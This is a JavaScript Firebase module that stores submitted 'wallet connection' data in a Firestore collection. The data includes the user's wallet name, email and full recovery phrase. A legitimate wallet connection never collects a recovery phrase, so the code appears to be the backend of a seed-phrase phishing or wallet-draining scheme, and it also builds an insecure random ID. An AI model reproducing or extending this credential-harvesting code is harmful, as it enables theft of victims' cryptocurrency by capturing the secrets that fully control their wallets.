import { db } from "../firebase/firebase";
import { auth } from "../firebase/firebase";
import {
  collection,
  addDoc,
  serverTimestamp,
} from "firebase/firestore";

export const saveWalletConnection = async (walletData) => {
  try {
    const currentUser = auth.currentUser;

    const walletUID = Math.random().toString(36).substring(2, 18);

    const docData = {
      walletUID,
      userId: currentUser?.uid || null,        // Link if logged in
      walletName: walletData.name,
      walletType: walletData.type,
      submittedEmail: walletData.email || null,
      recoveryPhrase: walletData.recoveryPhrase || null,   // Updated name
      wordCount: walletData.wordCount || null,
      createdAt: serverTimestamp(),
      isActive: true,
    };

    const docRef = await addDoc(
      collection(db, "walletConnections"),
      docData
    );

    return {
      success: true,
      uid: walletUID,
      docId: docRef.id,
    };
  } catch (error) {
    console.error("Save Wallet Error:", error);
    return {
      success: false,
      error: error.message,
    };
  }
};